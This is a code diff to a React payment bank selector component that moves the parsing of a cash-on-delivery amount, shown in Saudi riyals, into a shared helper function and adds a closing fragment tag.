@@ -10,6 +10,7 @@ import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
+import { getPaymentAmount } from "@/utils/paymentData";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -37,21 +38,8 @@ const PaymentBankSelector = () => {
   
   const shippingInfo = linkData?.payload as any;
 
-  // Get amount from link data - ensure it's a number, handle all data types
-  const rawAmount = shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
+  // Get amount dynamically from any service type
+  const amount = getPaymentAmount(linkData?.payload);
 
   const formattedAmount = `${amount} ر.س`;
   
@@ -324,6 +312,7 @@ const PaymentBankSelector = () => {
         )}
       </div>
     </div>
+    </>
   );
 };
 
